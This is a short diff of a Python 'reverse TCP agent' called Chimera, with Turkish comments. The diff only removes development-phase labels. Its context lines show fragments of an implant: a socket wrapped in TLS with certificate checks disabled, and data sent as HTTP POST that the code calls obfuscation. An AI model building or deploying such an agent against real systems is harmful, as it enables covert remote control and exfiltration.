@@ -1,5 +1,5 @@
 """
-Chimera Core Agent v0.1 - Faz 1.1
+Chimera Core Agent v0.1
 Mah Framework için geliştirilmiş temel reverse TCP ajanı.
 Sadece Python 3 standart kütüphaneleri kullanır.
 """
@@ -46,7 +46,7 @@ class ChimeraAgent:
             raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             raw_sock.settimeout(30)
             
-            # SSL Context oluştur (Faz 1.3)
+            # SSL Context oluştur
             # Self-signed sertifikaları kabul et
             context = ssl.create_default_context()
             context.check_hostname = False
@@ -98,7 +98,7 @@ class ChimeraAgent:
     # Format: [4 byte big-endian uzunluk][UTF-8 data]
     # --------------------------------------------------------
     # --------------------------------------------------------
-    # Protokol: HTTP over TLS (Faz 1.3)
+    # Protokol: HTTP over TLS
     # --------------------------------------------------------
     def send_data(self, data: str):
         """Veriyi HTTP POST request olarak gönderir (Obfuscation)."""
